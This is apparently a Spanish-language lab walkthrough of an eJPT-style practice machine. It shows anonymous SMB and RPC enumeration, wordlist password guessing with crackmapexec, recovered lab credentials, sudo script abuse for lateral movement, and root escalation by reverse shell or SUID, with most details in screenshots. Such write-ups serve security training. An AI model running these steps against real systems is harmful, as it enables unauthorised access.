- ---
- Tags: #ejptmachine #smb  #crackmapexec 
---

![Pasted image 20250207191725](../../Fotos/Pasted%20image%2020250207191725.png)

![Pasted image 20250207191847](../../Fotos/Pasted%20image%2020250207191847.png)

![Pasted image 20250207191902](../../Fotos/Pasted%20image%2020250207191902.png)

![Pasted image 20250207191908](../../Fotos/Pasted%20image%2020250207191908.png)

----
`crackmapexec smb 172.17.0.2 -u '' -p '' --shares`
![Pasted image 20250207192723](../../Fotos/Pasted%20image%2020250207192723.png)
o tambien
`smbclient -N -L \\\\172.17.0.2\\`
![Pasted image 20250207192706](../../Fotos/Pasted%20image%2020250207192706.png)

----

`rpcclient -U "" -N 172.17.0.2`
- Comando: enumdomusers
![Pasted image 20250207193244](../../Fotos/Pasted%20image%2020250207193244.png)
- User jon

![Pasted image 20250207193500](../../Fotos/Pasted%20image%2020250207193500.png)
- Hacemos un diccionario con lo encontrado en /dragon

`crackmapexec smb 172.17.0.2 -u jon -p pass.txt`
![Pasted image 20250207193534](../../Fotos/Pasted%20image%2020250207193534.png)
- jon:seacercaelinvierno

`smbclient //172.17.0.2/shared -U jon%seacercaelinvierno`
![Pasted image 20250207194418](../../Fotos/Pasted%20image%2020250207194418.png)

Descargamos con `get`
![Pasted image 20250207194603](../../Fotos/Pasted%20image%2020250207194603.png)

![Pasted image 20250207194623](../../Fotos/Pasted%20image%2020250207194623.png)

![Pasted image 20250207194720](../../Fotos/Pasted%20image%2020250207194720.png)
- hijodelanister

![Pasted image 20250207194804](../../Fotos/Pasted%20image%2020250207194804.png)

![Pasted image 20250207194819](../../Fotos/Pasted%20image%2020250207194819.png)

![Pasted image 20250207194839](../../Fotos/Pasted%20image%2020250207194839.png)

![Pasted image 20250207194847](../../Fotos/Pasted%20image%2020250207194847.png)

![Pasted image 20250207194857](../../Fotos/Pasted%20image%2020250207194857.png)

Borramos el script para ingresar uno con nuevas instrucciones

![Pasted image 20250207201349](../../Fotos/Pasted%20image%2020250207201349.png)

`sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py`
![Pasted image 20250207201501](../../Fotos/Pasted%20image%2020250207201501.png)

![Pasted image 20250207201623](../../Fotos/Pasted%20image%2020250207201623.png)

`sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon`
![Pasted image 20250207201645](../../Fotos/Pasted%20image%2020250207201645.png)
- drakaris

![Pasted image 20250207201852](../../Fotos/Pasted%20image%2020250207201852.png)

![Pasted image 20250207201858](../../Fotos/Pasted%20image%2020250207201858.png)

![Pasted image 20250207201923](../../Fotos/Pasted%20image%2020250207201923.png)

----
### Forma 1 bash directa
Tenemos una reverse shell pero lo que queremos es lanzar una bash como root
![Pasted image 20250207202355](../../Fotos/Pasted%20image%2020250207202355.png)

![Pasted image 20250207202330](../../Fotos/Pasted%20image%2020250207202330.png)

### Forma 2 SUID
O tambien podria haber sido por SUID
![Pasted image 20250207202420](../../Fotos/Pasted%20image%2020250207202420.png)

![Pasted image 20250207202431](../../Fotos/Pasted%20image%2020250207202431.png)






